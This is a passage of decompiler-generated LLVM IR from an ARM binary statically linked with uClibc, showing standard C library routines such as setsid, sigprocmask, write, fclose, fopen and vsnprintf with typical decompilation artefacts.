  %v1_12c58 = sub i32 0, %v0_12c58
  %v2_12c5c = inttoptr i32 %v0_12c54 to i32*
  store i32 %v1_12c58, i32* %v2_12c5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12c64

dec_label_pc_12c64:                               ; preds = %entry, %dec_label_pc_12c54
  %v0_12c64 = phi i32 [ %v4_12c44, %entry ], [ -1, %dec_label_pc_12c54 ]
  %v2_12c68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12c68, i32* @r4, align 4
  ret i32 %v0_12c64

; uselistorder directives
  uselistorder i32 %v4_12c44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c64, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c6c = load i32, i32* @r4, align 4
  store i32 %v3_12c6c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12c94, label %dec_label_pc_12c84

dec_label_pc_12c84:                               ; preds = %entry
  %v0_12c84 = call i32 @__errno_location()
  %v0_12c88 = load i32, i32* %r4.global-to-local, align 4
  %v1_12c88 = sub i32 0, %v0_12c88
  %v2_12c8c = inttoptr i32 %v0_12c84 to i32*
  store i32 %v1_12c88, i32* %v2_12c8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_12c98.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c94

dec_label_pc_12c94:                               ; preds = %entry, %dec_label_pc_12c84
  %v2_12c98 = phi i32 [ %v3_12c6c, %entry ], [ %v2_12c98.pre, %dec_label_pc_12c84 ]
  %v0_12c94 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12c84 ]
  store i32 %v2_12c98, i32* @r4, align 4
  ret i32 %v0_12c94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12c94, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c9c = load i32, i32* @r4, align 4
  store i32 %v3_12c9c, i32* %stack_var_-8, align 4
  %v0_12ca0 = call i32 @setsid()
  store i32 %v0_12ca0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ca0, -4095
  br i1 %tmp, label %dec_label_pc_12cc0, label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %entry
  %v0_12cb0 = call i32 @__errno_location()
  %v0_12cb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12cb4 = sub i32 0, %v0_12cb4
  %v2_12cb8 = inttoptr i32 %v0_12cb0 to i32*
  store i32 %v1_12cb4, i32* %v2_12cb8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12cc0

dec_label_pc_12cc0:                               ; preds = %entry, %dec_label_pc_12cb0
  %v0_12cc0 = phi i32 [ %v0_12ca0, %entry ], [ -1, %dec_label_pc_12cb0 ]
  %v2_12cc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12cc4, i32* @r4, align 4
  ret i32 %v0_12cc0

; uselistorder directives
  uselistorder i32 %v0_12ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12cc0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12cc8 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_12cc8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_12cd05 = load i32, i32* @r4, align 4
  store i32 %v3_12cd05, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12cf0

bb:                                               ; preds = %entry
  %v3_12cd0 = load i32, i32* @r4, align 4
  store i32 %v3_12cd0, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_12cf0, label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %bb
  %v0_12cdc = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_12ce8 = inttoptr i32 %v0_12cdc to i32*
  store i32 22, i32* %v2_12ce8, align 4
  %v0_12d14.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12d14

dec_label_pc_12cf0:                               ; preds = %.thread, %bb
  %v7_12cf0 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_12cf0, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_12cf0, -4095
  br i1 %tmp13, label %dec_label_pc_12d10, label %dec_label_pc_12d00

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12cf0
  %v0_12d00 = call i32 @__errno_location()
  %v0_12d04 = load i32, i32* %r4.global-to-local, align 4
  %v1_12d04 = sub i32 0, %v0_12d04
  %v2_12d08 = inttoptr i32 %v0_12d00 to i32*
  store i32 %v1_12d04, i32* %v2_12d08, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12cf0, %dec_label_pc_12d00
  %v0_12d10 = phi i32 [ %v7_12cf0, %dec_label_pc_12cf0 ], [ -1, %dec_label_pc_12d00 ]
  store i32 %v0_12d10, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12cdc, %dec_label_pc_12d10
  %v0_12d14 = phi i32 [ %v0_12d14.pre, %dec_label_pc_12cdc ], [ %v0_12d10, %dec_label_pc_12d10 ]
  %v2_12d18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12d18, i32* @r4, align 4
  ret i32 %v0_12d14

; uselistorder directives
  uselistorder i32 %v7_12cf0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_12d14, { 1, 0 }
  uselistorder label %dec_label_pc_12d10, { 1, 0 }
  uselistorder label %dec_label_pc_12cf0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12d1c = load i32, i32* @r4, align 4
  store i32 %v3_12d1c, i32* %stack_var_-8, align 4
  %v2_12d20 = call i32 @time(i32* %arg1)
  store i32 %v2_12d20, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_12d20, -4095
  br i1 %tmp, label %dec_label_pc_12d40, label %dec_label_pc_12d30

dec_label_pc_12d30:                               ; preds = %entry
  %v0_12d30 = call i32 @__errno_location()
  %v0_12d34 = load i32, i32* %r4.global-to-local, align 4
  %v1_12d34 = sub i32 0, %v0_12d34
  %v2_12d38 = inttoptr i32 %v0_12d30 to i32*
  store i32 %v1_12d34, i32* %v2_12d38, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d40

dec_label_pc_12d40:                               ; preds = %entry, %dec_label_pc_12d30
  %v0_12d40 = phi i32 [ %v2_12d20, %entry ], [ -1, %dec_label_pc_12d30 ]
  %v2_12d44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12d44, i32* @r4, align 4
  ret i32 %v0_12d40

; uselistorder directives
  uselistorder i32 %v2_12d20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12d40, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_12d4c = call i32 @wait4()
  ret i32 %v0_12d4c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12d50 = load i32, i32* @r4, align 4
  store i32 %v3_12d50, i32* %stack_var_-8, align 4
  %v3_12d54 = load i32, i32* @r2, align 4
  %v4_12d54 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_12d54)
  store i32 %v4_12d54, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_12d54, -4095
  br i1 %tmp, label %dec_label_pc_12d74, label %dec_label_pc_12d64

dec_label_pc_12d64:                               ; preds = %entry
  %v0_12d64 = call i32 @__errno_location()
  %v0_12d68 = load i32, i32* %r4.global-to-local, align 4
  %v1_12d68 = sub i32 0, %v0_12d68
  %v2_12d6c = inttoptr i32 %v0_12d64 to i32*
  store i32 %v1_12d68, i32* %v2_12d6c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d74

dec_label_pc_12d74:                               ; preds = %entry, %dec_label_pc_12d64
  %v0_12d74 = phi i32 [ %v4_12d54, %entry ], [ -1, %dec_label_pc_12d64 ]
  %v2_12d78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12d78, i32* @r4, align 4
  ret i32 %v0_12d74

; uselistorder directives
  uselistorder i32 %v4_12d54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12d74, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12d80 = load i32, i32* @global_var_26250, align 4
  %v3_12d84 = mul i32 %arg1, 2
  %v4_12d84 = add i32 %v2_12d80, %v3_12d84
  %v5_12d84 = inttoptr i32 %v4_12d84 to i8*
  %v6_12d84 = load i8, i8* %v5_12d84, align 1
  %v8_12d84 = zext i8 %v6_12d84 to i32
  %v1_12d88 = and i32 %v8_12d84, 32
  ret i32 %v1_12d88
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_12d9c = icmp slt i32 %arg1, 0
  br i1 %v1_12d9c, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_12d9c = mul i32 %arg1, 2
  %v2_12da8 = load i32, i32* @global_var_26258, align 4
  %v2_12dac = add i32 %v2_12da8, %v2_12d9c
  %v3_12db0 = inttoptr i32 %v2_12dac to i8*
  %v4_12db0 = load i8, i8* %v3_12db0, align 1
  %v6_12db0 = zext i8 %v4_12db0 to i32
  %v1_12db4 = add i32 %v2_12dac, 1
  %v2_12db4 = inttoptr i32 %v1_12db4 to i8*
  %v3_12db4 = load i8, i8* %v2_12db4, align 1
  %v4_12db4 = zext i8 %v3_12db4 to i32
  %v3_12db8 = mul nuw i32 %v4_12db4, 16777216
  %v4_12dbc = sdiv i32 %v3_12db8, 65536
  %v5_12dbc = or i32 %v4_12dbc, %v6_12db0
  ret i32 %v5_12dbc

; uselistorder directives
  uselistorder i32 %v2_12dac, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2c820.823 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12dd4 = load i32, i32* @r4, align 4
  store i32 %v3_12dd4, i32* %stack_var_-32, align 4
  %v6_12dd4 = load i32, i32* @r5, align 4
  %v9_12dd4 = load i32, i32* @r6, align 4
  %v12_12dd4 = load i32, i32* @r7, align 4
  %v15_12dd4 = load i32, i32* @r8, align 4
  %v2_12dd8 = add i32 %tmp, 52
  %v3_12dd8 = inttoptr i32 %v2_12dd8 to i32*
  %v4_12dd8 = load i32, i32* %v3_12dd8, align 4
  store i32 %v4_12dd8, i32* @r8, align 4
  %v2_12ddc = add i32 %tmp, 56
  store i32 %v2_12ddc, i32* @r5, align 4
  %v2_12de0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_12de4 = icmp eq i32 %v4_12dd8, 0
  store i1 %v2_12de4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_12df4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_12df4, i32* @r0, align 4
  br i1 %v2_12de4, label %dec_label_pc_12dfc, label %dec_label_pc_12e18

dec_label_pc_12dfc:                               ; preds = %entry
  store i32 92940, i32* %r3.global-to-local, align 4
  %v1_12e04 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r3.global-to-local, align 4
  %v1_12e14 = call i32 @__pthread_return_0()
  %v0_12e18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %entry, %dec_label_pc_12dfc
  %v0_12e20 = phi i32 [ %tmp, %entry ], [ %v0_12e18.pre, %dec_label_pc_12dfc ]
  %v1_12e18 = inttoptr i32 %v0_12e20 to i8*
  %v2_12e18 = load i8, i8* %v1_12e18, align 1
  %v3_12e18 = zext i8 %v2_12e18 to i32
  %v1_12e1c = and i32 %v3_12e18, 64
  store i32 %v1_12e1c, i32* %r3.global-to-local, align 4
  %v2_12e1c = icmp eq i32 %v1_12e1c, 0
  store i1 %v2_12e1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_12e1c, i32* @r7, align 4
  br i1 %v2_12e1c, label %dec_label_pc_12e34, label %dec_label_pc_12e2c

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12e18
  %v3_12e2c = call i32 @fflush_unlocked(i8* %v1_12e18)
  store i32 %v3_12e2c, i32* @r7, align 4
  %v0_12e34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12e34

dec_label_pc_12e34:                               ; preds = %dec_label_pc_12e18, %dec_label_pc_12e2c
  %v0_12e34 = phi i32 [ %v0_12e20, %dec_label_pc_12e18 ], [ %v0_12e34.pre, %dec_label_pc_12e2c ]
  %v1_12e34 = add i32 %v0_12e34, 4
  %v2_12e34 = inttoptr i32 %v1_12e34 to i32*
  %v3_12e34 = load i32, i32* %v2_12e34, align 4
  %v1_12e38 = call i32 @__libc_close(i32 %v3_12e34)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_12e40 = icmp slt i32 %v1_12e38, 0
  %v2_12e40 = icmp eq i32 %v1_12e38, 0
  store i1 %v2_12e40, i1* %cpsr_z.global-to-local, align 1
  %v1_12e44 = load i32, i32* @r4, align 4
  %v2_12e44 = add i32 %v1_12e44, 4
  %v3_12e44 = inttoptr i32 %v2_12e44 to i32*
  store i32 -1, i32* %v3_12e44, align 4
  store i32 %v2_12de0, i32* @r0, align 4
  br i1 %v1_12e40, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_12e34
  %v3_12e58 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_12e58, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_12e34, %bb
  %v1_12e64 = call i32 @__pthread_return_void()
  %v1_12e70 = call i32 @__pthread_return_0()
  %v2_12e78 = load i32, i32* @global_var_2a5ec.831, align 4
  %v1_12e7c = add i32 %v2_12e78, 1
  store i32 %v1_12e7c, i32* %r3.global-to-local, align 4
  store i32 %v1_12e7c, i32* @global_var_2a5ec.831, align 4
  store i32 %v2_12de0, i32* @r0, align 4
  %v1_12e94 = call i32 @__pthread_return_void()
  %v0_12e98 = load i32, i32* @r4, align 4
  %v1_12e98 = inttoptr i32 %v0_12e98 to i32*
  %v2_12e98 = load i32, i32* %v1_12e98, align 4
  %v1_12e9c = and i32 %v2_12e98, 24576
  store i32 %v1_12e9c, i32* %r3.global-to-local, align 4
  %v3_12ea01 = udiv i32 %v1_12e9c, 256
  %v1_12ea4 = trunc i32 %v3_12ea01 to i8
  %v3_12ea4 = add i32 %v0_12e98, 1
  %v4_12ea4 = inttoptr i32 %v3_12ea4 to i8*
  store i8 %v1_12ea4, i8* %v4_12ea4, align 1
  %v0_12ea8 = load i32, i32* %r3.global-to-local, align 4
  %v1_12ea8 = trunc i32 %v0_12ea8 to i8
  %v2_12ea8 = load i32, i32* @r4, align 4
  %v3_12ea8 = inttoptr i32 %v2_12ea8 to i8*
  store i8 %v1_12ea8, i8* %v3_12ea8, align 1
  %v0_12eac = load i32, i32* @r4, align 4
  %v1_12eac = inttoptr i32 %v0_12eac to i32*
  %v2_12eac = load i32, i32* %v1_12eac, align 4
  %v1_12eb0 = or i32 %v2_12eac, 48
  store i32 %v1_12eb0, i32* %r3.global-to-local, align 4
  %v3_12eb4 = sdiv i32 %v2_12eac, 256
  %v0_12eb8 = load i32, i32* @r8, align 4
  %v2_12eb8 = icmp eq i32 %v0_12eb8, 0
  store i1 %v2_12eb8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_12df4, i32* @r0, align 4
  %v1_12ec8 = trunc i32 %v3_12eb4 to i8
  %v3_12ec8 = add i32 %v0_12eac, 1
  %v4_12ec8 = inttoptr i32 %v3_12ec8 to i8*
  store i8 %v1_12ec8, i8* %v4_12ec8, align 1
  %v0_12ecc = load i32, i32* %r3.global-to-local, align 4
  %v1_12ecc = trunc i32 %v0_12ecc to i8
  %v2_12ecc = load i32, i32* @r4, align 4
  %v3_12ecc = inttoptr i32 %v2_12ecc to i8*
  store i8 %v1_12ecc, i8* %v3_12ecc, align 1
  %v0_12ed0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12ed0, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_12ed4 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_12ed8 = load i32, i32* @r4, align 4
  %v1_12ed8 = add i32 %v0_12ed8, 1
  %v2_12ed8 = inttoptr i32 %v1_12ed8 to i8*
  %v3_12ed8 = load i8, i8* %v2_12ed8, align 1
  %v4_12ed8 = zext i8 %v3_12ed8 to i32
  store i32 %v4_12ed8, i32* %r3.global-to-local, align 4
  %v1_12edc = and i32 %v4_12ed8, 64
  %v2_12edc = icmp eq i32 %v1_12edc, 0
  store i1 %v2_12edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12edc, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_12ee4 = xor i1 %v2_12edc, true
  call void @__pseudo_cond_branch(i1 %v1_12ee4, i32 ptrtoint (i32* @global_var_15a00.833 to i32))
  store i32 %v2_12de0, i32* @r0, align 4
  %v1_12ef8 = call i32 @__pthread_return_void()
  %v1_12f04 = call i32 @__pthread_return_0()
  %v2_12f0c = load i32, i32* @global_var_2a5f0.836, align 4
  %v1_12f10 = add i32 %v2_12f0c, 1
  store i32 %v1_12f10, i32* %r3.global-to-local, align 4
  store i32 %v2_12de0, i32* @r0, align 4
  store i32 %v1_12f10, i32* @global_var_2a5f0.836, align 4
  %v1_12f24 = call i32 @__pthread_return_void()
  %v1_12f28 = call i32 @_stdio_openlist_dec_use(i32 %v1_12f24)
  %v0_12f2c = load i32, i32* @r7, align 4
  %v2_12f34 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12f34, i32* @r4, align 4
  store i32 %v6_12dd4, i32* @r5, align 4
  store i32 %v9_12dd4, i32* @r6, align 4
  store i32 %v12_12dd4, i32* @r7, align 4
  store i32 %v15_12dd4, i32* @r8, align 4
  ret i32 %v0_12f2c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_12e34, { 1, 0 }
  uselistorder label %dec_label_pc_12e18, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_12f5c = call i32 @_stdio_fopen()
  ret i32 %v0_12f5c
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_12f6c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_12f6c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_12f80 = call i32 @__GI_vsnprintf()
  ret i32 %v0_12f80

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_12f94 = load i32, i32* @r4, align 4
  %v6_12f94 = load i32, i32* @r5, align 4
  %v12_12f94 = load i32, i32* @r7, align 4
  %v15_12f94 = load i32, i32* @r8, align 4
  %v18_12f94 = load i32, i32* @sl, align 4
  %v0_12f98 = load i32, i32* @r3, align 4
  store i32 %v0_12f98, i32* @r8, align 4
  %v2_12f9c = ptrtoint i32* %stack_var_-108 to i32
  %v0_12fa4 = load i32, i32* @r0, align 4
  %v1_12fa4 = sub i32 -1, %v0_12fa4
  store i32 %v1_12fa4, i32* @r5, align 4
  store i32 %v0_12fa4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_12fb8 = load i32, i32* @r1, align 4
  %v3_12fb8 = icmp ult i32 %v1_12fa4, %v1_12fb8
  br i1 %v3_12fb8, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_12fb8, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_12fc0 = load i32, i32* @r2, align 4
  store i32 %v0_12fc0, i32* @r7, align 4
  %v2_12fc4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_12fc4, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_12fe0 = call i32 @__stdio_init_mutex()
  %v0_12fe4 = load i32, i32* @r4, align 4
  %v1_12fe4 = load i32, i32* @r5, align 4
  %v2_12fe4 = add i32 %v1_12fe4, %v0_12fe4
  %v0_12fec = load i32, i32* @r7, align 4
  %v0_12ff0 = load i32, i32* @r8, align 4
  %v0_12ffc = load i32, i32* @sl, align 4
  %v12_13010 = inttoptr i32 %v0_12fec to i8*
  %v13_13010 = call i32 @_vfprintf_internal(i32 %v2_12f9c, i8* %v12_13010, i32 %v0_12ff0, i32 %v2_12fe4, i32 %v0_12fe4, i32 %v2_12fe4, i32 %v0_12fe4, i32 %v0_12fe4, i32 %v0_12fe4, i32 %v2_12fe4, i32 %v0_12ffc)
  %v0_13014 = load i32, i32* @r5, align 4
  %v1_13014 = load i32, i32* @sl, align 4
  %v9_13014 = icmp eq i32 %v0_13014, %v1_13014
  br i1 %v9_13014, label %dec_label_pc_1303c, label %dec_label_pc_13020

dec_label_pc_13020:                               ; preds = %bb23
  %v9_13028 = icmp eq i32 %v1_12fe4, 0
  %v1_1302c = sext i1 %v9_13028 to i32
  %v1_1302c.v0_12ff4 = add i32 %v0_12fe4, %v1_1302c
  %stack_var_-92.0 = inttoptr i32 %v1_1302c.v0_12ff4 to i8*
  %v1_13038 = trunc i32 %v1_13014 to i8
  store i8 %v1_13038, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_1303c

dec_label_pc_1303c:                               ; preds = %bb23, %dec_label_pc_13020
  store i32 %v3_12f94, i32* @r4, align 4
  store i32 %v6_12f94, i32* @r5, align 4
  store i32 %v12_12f94, i32* @r7, align 4
  store i32 %v15_12f94, i32* @r8, align 4
  store i32 %v18_12f94, i32* @sl, align 4
  ret i32 %v13_13010

; uselistorder directives
  uselistorder i32 %v1_12fe4, { 1, 0 }
  uselistorder i32 %v0_12fe4, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_12fb8, { 1, 0 }
  uselistorder i32 %v0_12fa4, { 1, 0 }
  uselistorder label %dec_label_pc_1303c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13044 = load i32, i32* @r4, align 4
  store i32 %v3_13044, i32* %stack_var_-24, align 4
  %v6_13044 = load i32, i32* @r5, align 4
  %v9_13044 = load i32, i32* @r6, align 4
  %v15_13044 = load i32, i32* @r8, align 4
  %v0_13048 = load i32, i32* @r1, align 4
  %v1_13048 = inttoptr i32 %v0_13048 to i8*
  %v2_13048 = load i8, i8* %v1_13048, align 1
  %v7_1304c = icmp eq i8 %v2_13048, 114
  store i1 %v7_1304c, i1* %cpsr_z.global-to-local, align 1
  %v2_13050 = ptrtoint i32* %stack_var_-56 to i32
  %v0_13054 = load i32, i32* @r0, align 4
  store i32 %v0_13054, i32* @r6, align 4
  %v0_13058 = load i32, i32* @r2, align 4
  store i32 %v0_13058, i32* @r8, align 4
  %v0_1305c = load i32, i32* @r3, align 4
  store i32 %v0_1305c, i32* @r5, align 4
  br i1 %v7_1304c, label %dec_label_pc_130a8, label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %entry
  %v7_13064 = icmp eq i8 %v2_13048, 119
  store i1 %v7_13064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13064, label %bb, label %dec_label_pc_13070

bb:                                               ; preds = %dec_label_pc_13064
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_130ac

dec_label_pc_13070:                               ; preds = %dec_label_pc_13064
  %v7_13070 = icmp eq i8 %v2_13048, 97
  store i1 %v7_13070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13070, label %bb30, label %dec_label_pc_1307c

bb30:                                             ; preds = %dec_label_pc_13070
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_130ac

dec_label_pc_1307c:                               ; preds = %dec_label_pc_13070, %dec_label_pc_13134, %dec_label_pc_13108
  %v0_1307c = call i32 @__errno_location()
  store i32 %v0_1307c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_13084 = load i32, i32* @r8, align 4
  %v2_13084 = icmp eq i32 %v0_13084, 0
  store i1 %v2_13084, i1* %cpsr_z.global-to-local, align 1
  %v2_13088 = inttoptr i32 %v0_1307c to i32*
  store i32 22, i32* %v2_13088, align 4
  br i1 %v2_13084, label %dec_label_pc_132fc, label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %dec_label_pc_13158._crit_edge, %dec_label_pc_1307c
  %v0_13090 = load i32, i32* @r8, align 4
  %v1_13090 = add i32 %v0_13090, 1
  %v2_13090 = inttoptr i32 %v1_13090 to i8*
  %v3_13090 = load i8, i8* %v2_13090, align 1
  %v4_13090 = zext i8 %v3_13090 to i32
  store i32 %v4_13090, i32* %r3.global-to-local, align 4
  %v1_13094 = and i32 %v4_13090, 32
  %v2_13094 = icmp eq i32 %v1_13094, 0
  store i1 %v2_13094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13094, label %dec_label_pc_132fc, label %dec_label_pc_1309c

dec_label_pc_1309c:                               ; preds = %dec_label_pc_13090
  store i32 %v0_13090, i32* @r0, align 4
  %v0_130a0 = call i32 @free()
  store i32 %v0_130a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_132fc

dec_label_pc_130a8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_130ac

dec_label_pc_130ac:                               ; preds = %bb, %bb30, %dec_label_pc_130a8
  %v1_130c4 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_130a8 ]
  %v1_130ac = add i32 %v0_13048, 1
  %v2_130ac = inttoptr i32 %v1_130ac to i8*
  %v3_130ac = load i8, i8* %v2_130ac, align 1
  %v7_130b0 = icmp eq i8 %v3_130ac, 98
  store i1 %v7_130b0, i1* %cpsr_z.global-to-local, align 1
  %v1_130ac.v0_13048 = select i1 %v7_130b0, i32 %v1_130ac, i32 %v0_13048
  store i32 %v1_130ac.v0_13048, i32* %r3.global-to-local, align 4
  %v1_130bc = add i32 %v1_130ac.v0_13048, 1
  %v2_130bc = inttoptr i32 %v1_130bc to i8*
  %v3_130bc = load i8, i8* %v2_130bc, align 1
  %v4_130bc = zext i8 %v3_130bc to i32
  store i32 %v4_130bc, i32* %r3.global-to-local, align 4
  %v7_130c0 = icmp eq i8 %v3_130bc, 43
  store i1 %v7_130c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_130c0, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_130ac
  store i32 %v1_130c4, i32* %r3.global-to-local, align 4
  %v2_130c8 = add nuw nsw i32 %v1_130c4, 1
  store i32 %v2_130c8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_130ac, %bb33
  %v2_130cc = icmp eq i32 %v0_13058, 0
